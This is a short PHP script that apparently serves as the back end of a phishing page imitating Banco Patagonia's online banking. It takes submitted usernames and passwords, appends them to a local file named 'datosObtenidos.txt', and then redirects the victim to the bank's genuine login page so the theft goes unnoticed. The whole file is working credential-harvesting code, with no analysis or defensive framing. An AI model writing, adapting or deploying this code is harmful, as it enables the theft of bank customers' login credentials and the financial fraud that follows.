<?php
$password = $_POST['password'];
$username = $_POST['username'];

$file = fopen("datosObtenidos.txt", "a");
fwrite($file, $username . '-' . $password . PHP_EOL);
fclose($file);

header("Location: https://ebankpersonas.bancopatagonia.com.ar/eBanking/usuarios/login.htm");
?>